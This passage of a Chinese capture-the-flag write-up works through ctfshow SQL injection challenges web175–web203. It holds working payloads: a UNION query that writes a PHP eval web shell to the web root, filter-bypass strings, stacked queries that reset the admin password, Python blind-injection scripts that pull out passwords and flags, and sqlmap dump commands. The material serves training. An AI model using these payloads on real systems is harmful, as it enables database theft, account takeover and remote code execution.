\u0026#34;ctfshow{GHIeaIeG-AGaG-DAab-HHae-eEaFcHFIEbef}\u0026#34; 4 5flag = flag64.replace(\u0026#34;A\u0026#34;, \u0026#34;1\u0026#34;).replace(\u0026#34;B\u0026#34;, \u0026#34;2\u0026#34;).replace(\u0026#34;C\u0026#34;, \u0026#34;3\u0026#34;).replace(\u0026#34;D\u0026#34;, \u0026#34;4\u0026#34;).replace(\u0026#34;E\u0026#34;, \u0026#34;5\u0026#34;).replace(\u0026#34;F\u0026#34;, \u0026#34;6\u0026#34;).replace(\u0026#34;G\u0026#34;, \u0026#34;7\u0026#34;).replace(\u0026#34;H\u0026#34;, \u0026#34;8\u0026#34;).replace(\u0026#34;I\u0026#34;, \u0026#34;9\u0026#34;).replace(\u0026#34;J\u0026#34;, \u0026#34;0\u0026#34;) 6 7print(flag) 又或者\n1\u0026#39; union select 1,\u0026#34;\u0026lt;?=eval($_POST[1]);?\u0026gt;\u0026#34; into outfile \u0026#34;/var/www/html/shell.php\u0026#34; --+ web175 //检查结果是否有flag if(!preg_match(\u0026#39;/[\\x00-\\x7f]/i\u0026#39;, json_encode($ret))){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;查询成功\u0026#39;; } 检查变量 $ret 经过 json_encode 编码后的结果中是否只包含 ASCII 字符（即字符编码范围在 \\x00 到 \\x7f 之间）。如果不满足这个条件，就将 $ret 数组中的 msg 键的值设置为 '查询成功'。\n也就是没有任何回显\n方法一：时间盲注\n大佬的脚本，用的二分法\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1\u0026#39; and \u0026#34; 5 6result = \u0026#39;\u0026#39; 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 payload = f\u0026#39;1=if(ascii(substr((select password from ctfshow_user5 limit 24,1),{i},1))\u0026gt;{mid},sleep(2),0) -- -\u0026#39; 17 try: 18 r = requests.get(url + payload, timeout=0.5) 19 tail = mid 20 except Exception as e: 21 head = mid + 1 22 23 if head != 32: 24 result += chr(head) 25 else: 26 break 27 print(result) 方法二:利用读写文件写入网站根目录 http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/api/v5.php?id=1' union select 1,password from ctfshow_user5 into outfile \u0026lsquo;/var/www/html/1.txt\u0026rsquo;\u0026ndash;+\u0026amp;page=1\u0026amp;limit=10 之后访问http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/1.txt\n过滤注入（对传入参数进行过滤） web176 //对传入的参数进行了过滤 function waf($str){ //代码过于简单，不宜展示 } 方法一：万能钥匙\n1\u0026#39; or 1=1--+ 能找到flag\n方法二:大小写绕过\n1\u0026#39; uNion sElect 1,2,password from ctfshow_user --+ web177 黑名单：空格、+\n空格替代：%20（普通空格）、%09（水平制表符）、%0a（换行符）、%0b（回车符）、%0c（新一页）、%0d（垂直制表符）、%a0、()、``、\\**\\\n可以用\\**\\绕过\n1\u0026#39;/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/=\u0026#39;flag\u0026#39;%23 方法二:万能钥匙\nweb178 黑名单增加：%20、*\n1\u0026#39;%09union%09select%09password,1,1%09from%09ctfshow_user%09where%09username%09=\u0026#39;flag\u0026#39;%23 方法二:万能钥匙\nweb179 黑名单增加：%09、%0a、%0b、%0d\n这题把%09也过滤了，这题空格可以用%0c绕过\n1\u0026#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23 web180 黑名单增加：#\n可以用\u0026ndash;%0c代替#(%23)\n1\u0026#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user--%0c 或者直接万能密码\nid=-1\u0026#39;or(id=26)and\u0026#39;1\u0026#39;=\u0026#39;1 web181 1//对传入的参数进行了过滤 2 function waf($str){ 3 return preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select/i\u0026#39;, $str); 4 } / 和 /i：正则表达式的定界符，/ 表示正则表达式的开始和结束，i 是修饰符，表示不区分大小写进行匹配。\n|\\*：匹配空格字符（）和星号（*），这两个字符在 SQL 注入中可能会被用于构造恶意语句。\n\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0\n：分别匹配不同的 ASCII 控制字符和特殊空白字符，例如：\n\\x09：水平制表符（Tab） \\x0a：换行符（LF） \\x0b：垂直制表符 \\x0c：换页符 \\x00：空字符 \\x0d：回车符（CR） \\xa0：不间断空格 \\x23|\\#：匹配井号（#），在 SQL 中，# 通常用于注释，攻击者可能会利用注释来绕过 SQL 语句的检查。\nfile|into|select：匹配关键字 file、into 和 select，这些关键字在 SQL 注入和文件包含攻击中经常被使用。\n方法一 用like来匹配关键词flag\n-1\u0026#39;%0cor%0cusername%0clike%0c\u0026#39;flag 方法二\n-1\u0026#39;or(id=26)and\u0026#39;1 看到一篇大佬的文章，感觉明了不少\nctfshow Web入门SQL注入 web171-197 Writeup - X1r0z Blog\nweb182 1//对传入的参数进行了过滤 2 function waf($str){ 3 return preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select|flag/i\u0026#39;, $str); 4 } 黑名单增加：flag\n这题可以用到like进行模糊查询\npayload:\n-1\u0026#39;or%0cusername%0clike%0c\u0026#39;fl% 或者继续使用上一题的方法二\nweb183 查询语句\n//拼接sql语句查找指定ID用户 $sql = \u0026#34;select count(pass) from \u0026#34;.$_POST[\u0026#39;tableName\u0026#39;].\u0026#34;;\u0026#34;; 返回逻辑\n//对传入的参数进行了过滤 function waf($str){ return preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into/i\u0026#39;, $str); } 查询结果\n//返回用户表的记录总数 $user_count = 0; 题目大概的意思就是我们传入表名进行查询，如果表名正确，就会返回用户表记录总数1，如果表名错误则返回0，且每次最多只会返回1，根据这个我们可以尝试布尔盲注，如果我们知道表名(ctfshow_user)和列名(pass)，我们就能通过布尔盲注拿到flag\nY4tacker大佬的脚本\nimport requests url = \u0026#39;http://ee0ad3ab-e8f0-4183-97a8-aa3c5bcbe4f4.challenge.ctf.show/select-waf.php\u0026#39; str = r\u0026#34;{abcdefghijklmnopqrstuvwsyz-0123456789}\u0026#34; flag = \u0026#34;\u0026#34; index = 0 while True: for i in str: data = { \u0026#39;tableName\u0026#39;: f\u0026#34;(ctfshow_user)where(substr(pass,{index},1))regexp(\u0026#39;{i}\u0026#39;)\u0026#34; } r = requests.post(url, data=data) if r.text.find(\u0026#34;$user_count = 1;\u0026#34;) \u0026gt; 0: flag += i print(flag) break index += 1 不是为什么我flag的马甲是这样的\nweb184 1//对传入的参数进行了过滤 2 function waf($str){ 3 return preg_match(\u0026#39;/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\\u0026#39;|\\\u0026#34;|union|\\`|sleep|benchmark/i\u0026#39;, $str); 4 } 因为这题where被ban了，我们可以利用right join进行代替\n依旧是布尔盲注\nPOC\nimport requests url = \u0026#39;http://effed757-6639-46a9-9103-22fedb04bb41.challenge.ctf.show/select-waf.php\u0026#39; charset = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}\u0026#39; flag = \u0026#39;\u0026#39; for i in range(1, 50): # 假设 flag 最长 50 个字符 for j in charset: payload = f\u0026#34;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1) regexp char({ord(j)}))\u0026#34; data = { \u0026#39;tableName\u0026#39;: payload } response = requests.post(url, data=data) if \u0026#34;some_success_condition\u0026#34; in response.text: flag += j print(flag) break web185 //对传入的参数进行了过滤 function waf($str){ return preg_match(\u0026#39;/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\\u0026#39;|\\\u0026#34;|union|\\`|sleep|benchmark/i\u0026#39;, $str); } 这题把数字ban掉了\n这其实就导致了我们在构造payload的时候没办法直接使用数字\n但是我们可以用true来代替构造出数字\n我们知道true = 1\n那2就可以用true+true来表示，以此类推\n1import requests 2url = \u0026#34;http://33578c7b-f34a-422b-87a5-a8accac68645.challenge.ctf.show/select-waf.php\u0026#34; 3flag = \u0026#39;\u0026#39; 4 5 6def createNum(n): 7 num = \u0026#39;true\u0026#39; 8 if n == 1: 9 return \u0026#39;true\u0026#39; 10 else: 11 for i in range(n - 1): 12 num += \u0026#34;+true\u0026#34; 13 return num 14 15 16for i in range(45): 17 if i \u0026lt;= 5: 18 continue 19 for j in range(127): 20 data = { 21 \u0026#34;tableName\u0026#34;: f\u0026#34;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{createNum(i)},{createNum(1)})regexp(char({createNum(j)})))\u0026#34; 22 } 23 r = requests.post(url, data=data) 24 if r.text.find(\u0026#34;$user_count = 43;\u0026#34;) \u0026gt; 0: 25 if chr(j) != \u0026#34;.\u0026#34;: 26 flag += chr(j) 27 28 print(\u0026#34;[*]result is:\u0026#34;+flag.lower()) 29 if chr(j) == \u0026#34;}\u0026#34;: 30 exit(0) 31 break web186 //对传入的参数进行了过滤 function waf($str){ return preg_match(\u0026#39;/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\%|\\\u0026lt;|\\\u0026gt;|\\^|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\\u0026#39;|\\\u0026#34;|union|\\`|sleep|benchmark/i\u0026#39;, $str); } 解法和上题一样\nweb187 返回逻辑 $username = $_POST[\u0026#39;username\u0026#39;]; $password = md5($_POST[\u0026#39;password\u0026#39;],true); //只有admin可以获得flag if($username!=\u0026#39;admin\u0026#39;){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名不存在\u0026#39;; die(json_encode($ret)); } password=md5($pass,true)绕过、弱类型、MD5强碰撞_select * from \u0026lsquo;admin\u0026rsquo; where password=md5($pass,tru-CSDN博客\npayload:\nadmin/ffifdyop 抓个包\nweb188 查询语句 //拼接sql语句查找指定ID用户 $sql = \u0026#34;select pass from ctfshow_user where username = {$username}\u0026#34;; 返回逻辑 //用户名检测 if(preg_match(\u0026#39;/and|or|select|from|where|union|join|sleep|benchmark|,|\\(|\\)|\\\u0026#39;|\\\u0026#34;/i\u0026#39;, $username)){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; die(json_encode($ret)); } //密码检测 if(!is_numeric($password)){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; die(json_encode($ret)); } //密码判断 if($row[\u0026#39;pass\u0026#39;]==intval($password)){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; array_push($ret[\u0026#39;data\u0026#39;], array(\u0026#39;flag\u0026#39;=\u0026gt;$flag)); } ctfshow-sql注入-超详解(172-200)_ctfshow 172-CSDN博客\n所以payload为\n0/0 或者 1||1/0 https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v\nweb189 //拼接sql语句查找指定ID用户 $sql = \u0026#34;select pass from ctfshow_user where username = {$username}\u0026#34;; //用户名检测 if(preg_match(\u0026#39;/select|and| |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\x26|\\x7c|or|into|from|where|join|sleep|benchmark/i\u0026#39;, $username)){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; die(json_encode($ret)); } //密码检测 if(!is_numeric($password)){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; die(json_encode($ret)); } //密码判断 if($row[\u0026#39;pass\u0026#39;]==$password){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; } 这题在输入0/0的时候会显示密码错误，而在输入1/0的时候则会显示查询错误\n可以通过这个来进行布尔盲注，即正确时系统返回查询错误，错误时系统返回密码错误\n1# -*- coding: utf-8 -*- 2# @Author : Yn8rt 3# @Time : 2021/7/30 15:48 4# @Function: 5import requests 6import sys 7import json 8 9url = \u0026#39;http://98e1809d-5de9-4f68-b45f-d03388b1dae8.challenge.ctf.show/api/\u0026#39; 10flag = \u0026#39;ctfshow{\u0026#39; 11letter = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyz-{}\u0026#39; 12 13for i in range(100): 14 for j in letter: 15 payload = { 16 \u0026#34;username\u0026#34;: \u0026#34;if(load_file(\u0026#39;/var/www/html/api/index.php\u0026#39;)regexp(\u0026#39;{}\u0026#39;),0,1)\u0026#34;.format(flag + j), 17 \u0026#34;password\u0026#34;: \u0026#34;0\u0026#34; 18 19 } 20 r = requests.post(url=url,data=payload) 21 #print(r) 22 if \u0026#34;密码错误\u0026#34; == r.json()[\u0026#39;msg\u0026#39;]: 23 flag += j 24 print(flag) 25 break 26 if \u0026#39;}\u0026#39; in flag: 27 sys.exit() web190 查询语句\n//拼接sql语句查找指定ID用户 $sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; 返回逻辑\n//密码检测 if(!is_numeric($password)){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; die(json_encode($ret)); } //密码判断 if($row[\u0026#39;pass\u0026#39;]==$password){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; } //TODO:感觉少了个啥，奇怪 所以这题依旧可以进行布尔盲注\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://eb2e57dd-6c44-4140-9052-f549f647caa9.challenge.ctf.show/api/\u0026#34; 5 6result = \u0026#34;\u0026#34; 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 # 查数据库 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查字段 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_fl0g\u0026#39;\u0026#34; 20 # 查flag 21 payload = \u0026#34;select group_concat(f1ag) from ctfshow_fl0g\u0026#34; 22 data = { 23 \u0026#39;username\u0026#39;: f\u0026#34;admin\u0026#39; and if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},1,2)=\u0026#39;1\u0026#34;, 24 \u0026#39;password\u0026#39;: \u0026#39;1\u0026#39; 25 } 26 27 r = requests.post(url,data=data) 28 if \u0026#34;密码错误\u0026#34; == r.json()[\u0026#39;msg\u0026#39;]: 29 head = mid + 1 30 else: 31 tail = mid 32 33 if head != 32: 34 result += chr(head) 35 else: 36 break 37 print(result) web191 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 17 } 18 19 //TODO:感觉少了个啥，奇怪 20 if(preg_match(\u0026#39;/file|into|ascii/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 22 die(json_encode($ret)); 23 } 这题和上题一样，只是加了点ban掉了ascii\n我们用ord代替ascii即可\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://92a52ee7-65ff-4fff-b3d9-ec90f74fd2f5.challenge.ctf.show/api/\u0026#34; 5 6result = \u0026#34;\u0026#34; 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 # 查数据库 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查字段 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_fl0g\u0026#39;\u0026#34; 20 # 查flag 21 payload = \u0026#34;select group_concat(f1ag) from ctfshow_fl0g\u0026#34; 22 data = { 23 \u0026#39;username\u0026#39;: f\u0026#34;admin\u0026#39; and if(ord(substr(({payload}),{i},1))\u0026gt;{mid},1,2)=\u0026#39;1\u0026#34;, 24 \u0026#39;password\u0026#39;: \u0026#39;1\u0026#39; 25 } 26 27 r = requests.post(url,data=data) 28 if \u0026#34;密码错误\u0026#34; == r.json()[\u0026#39;msg\u0026#39;]: 29 head = mid + 1 30 else: 31 tail = mid 32 33 if head != 32: 34 result += chr(head) 35 else: 36 break 37 print(result) web192 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 17 } 18 19 //TODO:感觉少了个啥，奇怪 20 if(preg_match(\u0026#39;/file|into|ascii|ord|hex/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 22 die(json_encode($ret)); 23 } 不给我转是吧，那我不转了\n1import requests 2import string 3 4url = \u0026#34;http://20b20943-6b5a-464b-b13e-99ab8e2644b7.challenge.ctf.show/api/\u0026#34; 5flagstr=\u0026#34; _{}-\u0026#34; + string.ascii_lowercase + string.digits 6flag = \u0026#39;\u0026#39; 7for i in range(1,45): 8 for j in flagstr: 9 payload = f\u0026#34;admin\u0026#39; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),{i},1)regexp(\u0026#39;{j}\u0026#39;),1,2)=\u0026#39;1\u0026#34; 10 data = { 11 \u0026#39;username\u0026#39;: payload, 12 \u0026#39;password\u0026#39;: \u0026#39;1\u0026#39; 13 } 14 r = requests.post(url, data=data) 15 if \u0026#34;密码错误\u0026#34; == r.json()[\u0026#39;msg\u0026#39;]: 16 flag += j 17 print(flag) 18 if \u0026#34;}\u0026#34; in flag: 19 exit(0) 20 break 其实也差不多\n二分法脚本\n1 2# 用了二分法 dejavu~~~ 3import requests 4 5url = \u0026#34;http://c9b03201-bcdf-42ce-ac5b-c546603c1848.challenge.ctf.show:8080/api/\u0026#34; 6# 表名 CtFsHOw{FL0G,CtFsHOw{usEr 7# payload = \u0026#34;0\u0026#39; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)\u0026gt;\u0026#39;{}\u0026#39;,1,0) -- \u0026#34; 8# 列名 ID,F1AG,ID,usErNAME,pAss 9# payload = \u0026#34;0\u0026#39; or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),{},1)\u0026gt;\u0026#39;{}\u0026#39;,1,0) -- \u0026#34; 10# flag 11payload = \u0026#34;0\u0026#39; or if(substr((select f1ag from ctfshow_fl0g),{},1)\u0026gt;\u0026#39;{}\u0026#39;,1,0) -- \u0026#34; 12true_flag = \u0026#34;\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef\u0026#34; 13result = \u0026#34;\u0026#34; 14index = 1 15while True: 16 start = 32 17 end = 127 18 while not (abs(start-end) == 1 or start == end): 19 p = (start + end) // 2 20 data = { 21 \u0026#34;username\u0026#34;: payload.format(index, chr(p)), 22 \u0026#34;password\u0026#34;: 0 23 } 24 response = None 25 while True: 26 try: 27 response = requests.post(url, data=data) 28 except: 29 continue 30 break 31 if true_flag in response.text: 32 start = p 33 else: 34 end = p 35 if end \u0026lt; start: 36 end = start 37 result += chr(end) 38 print(f\u0026#34;[*] result: {result}\u0026#34;) 39 index += 1 web193 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 17 } 18 19 //TODO:感觉少了个啥，奇怪 20 if(preg_match(\u0026#39;/file|into|ascii|ord|hex|substr/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 22 die(json_encode($ret)); 23 } 新增waf：substr\n没办法进行截断，但其实问题不大\n1import requests 2import sys 3url = \u0026#39;http://a4ac8172-cadd-42ca-a986-771b4ab0400f.challenge.ctf.show/api/\u0026#39; 4result = \u0026#39;\u0026#39; 5letter = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyz-_,{}\u0026#39; 6 7for i in range(100): 8 for j in letter: 9 # 查表 10 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 11 # 查字段 12 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_fl0g\u0026#39;\u0026#34; 13 # 查flag 14 payload = \u0026#34;select group_concat(f1ag) from ctfshow_flxg\u0026#34; 15 16 data={ 17 \u0026#39;username\u0026#39;:\u0026#34;admin\u0026#39; and if(({}) like \u0026#39;{}%\u0026#39;,1,2) =\u0026#39;1\u0026#34;.format(payload,result+j), 18 \u0026#39;password\u0026#39;:1 19 } 20 res = requests.post(url=url,data=data) 21 if \u0026#34;密码错误\u0026#34; == res.json()[\u0026#39;msg\u0026#39;]: 22 result += j 23 print(result) 24 break 25 if \u0026#34;}\u0026#34; in result: 26 exit(0) 我们可以用like来达到差不多的效果\n这题也可以用char,left,right,substring之类的方法\nweb194 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 17 } 18 19 //TODO:感觉少了个啥，奇怪 20 if(preg_match(\u0026#39;/file|into|ascii|ord|hex|substr|char|left|right|substring/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 22 die(json_encode($ret)); 23 } 新增waf：char|left|right|substring\n上题的方法依旧适用\nweb195 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = {$username};\u0026#34;; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 17 } 18 19 //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧 20 if(preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|\\\u0026#39;|\\\u0026#34;|select|union|or|and|\\x26|\\x7c|file|into/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 22 die(json_encode($ret)); 23 } 24 25 if($row[0]==$password){ 26 $ret[\u0026#39;msg\u0026#39;]=\u0026#34;登陆成功 flag is $flag\u0026#34;; 27 } 根据提示堆叠注入\n其实就是在;后面再执行任意的sql命令\n这里直接改密码\npayload=\u0026#34;0x61646d696e;update`ctfshow_user`set`pass`=0x313131;\u0026#34; # 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围 sql = \u0026#34;select pass from ctfshow_user where username = {$username};\u0026#34;; # @Author:Y4tacker admin \u0026lt;=\u0026gt; 0x61646d696e 111\u0026lt;=\u0026gt;0x313131 web196 查询语句 //拼接sql语句查找指定ID用户 $sql = \u0026#34;select pass from ctfshow_user where username = {$username};\u0026#34;; 返回逻辑 //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧 if(preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|\\\u0026#39;|\\\u0026#34;|select|union|or|and|\\x26|\\x7c|file|into/i\u0026#39;, $username)){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; die(json_encode($ret)); } if(strlen($username)\u0026gt;16){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名不能超过16个字符\u0026#39;; die(json_encode($ret)); } if($row[0]==$password){ $ret[\u0026#39;msg\u0026#39;]=\u0026#34;登陆成功 flag is $flag\u0026#34;; } 这题应该是bug了，select没被waf\n在 PHP 里，当使用数据库查询语句从数据库中获取结果集时，通常会逐行遍历结果集。每一行数据可以用一个数组来表示，$row[0] 指的是这一行数组中的第一个元素。\npayload:\n0;select(2) 2 web197 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = {$username};\u0026#34;; 5 6返回逻辑 7 8 9 //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧 10 if(\u0026#39;/\\*|\\#|\\-|\\x23|\\\u0026#39;|\\\u0026#34;|union|or|and|\\x26|\\x7c|file|into|select|update|set//i\u0026#39;, $username)){ 11 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 12 die(json_encode($ret)); 13 } 14 15 if($row[0]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#34;登陆成功 flag is $flag\u0026#34;; 17 } 18 这把不能用select，那我们只需要想办法给$row[0]一个确定的值即可\n比如\nusername: 1;show tables password: ctfshow_user 其他的一些骚操作\n重写ctfshow_user表\n把密码和id列互换之后爆密码（实际上在爆id）\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/\u0026#34; 5for i in range(100): 6 if i == 0: 7 data = { 8 \u0026#39;username\u0026#39;: \u0026#39;0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user \u0026#39; 9 \u0026#39;change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` \u0026#39; 10 \u0026#39;varchar(255);\u0026#39;, 11 \u0026#39;password\u0026#39;: f\u0026#39;{i}\u0026#39; 12 } 13 r = requests.post(url, data=data) 14 data = { 15 \u0026#39;username\u0026#39;: \u0026#39;0x61646d696e\u0026#39;, 16 \u0026#39;password\u0026#39;: f\u0026#39;{i}\u0026#39; 17 } 18 r = requests.post(url, data=data) 19 if \u0026#34;登陆成功\u0026#34; in r.json()[\u0026#39;msg\u0026#39;]: 20 print(r.json()[\u0026#39;msg\u0026#39;]) 21 break web198 同web197\nweb199 通解一把梭\nweb200 通解一把梭\nweb190-web200通解 username=0;show tables; pass=ctfshow_user sqlmap的使用 web201 sqlmap最新版下载 使用--user-agent 指定agent 使用--referer 绕过referer检查 检测注入类型 python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/sqlmap.php/api/?id= --user-agent sqlmap --referer ctf.show 爆数据库 python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show --dbs 爆表 python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web --tables 爆列 python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --columns 爆值 python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump web202 sqlmap最新版下载 使用--data 调整sqlmap的请求方式 //拼接sql语句查找指定ID用户 $sql = \u0026#34;select id,username,password from ctfshow_user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39;;\u0026#34;; 返回逻辑 //对传入的参数进行了过滤 function waf($str){ //代码过于简单，不宜展示 } 通过向命令行加入\u0026ndash;data参数转化请求方式为post\nsqlmap -u http://e39cef84-16aa-4167-b5d8-2609318ff7cc.challenge.ctf.show/api/ --data \u0026#39;id=1\u0026#39; --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump web203 sqlmap最新版下载 使用--method 调整sqlmap的请求方式 查询语句 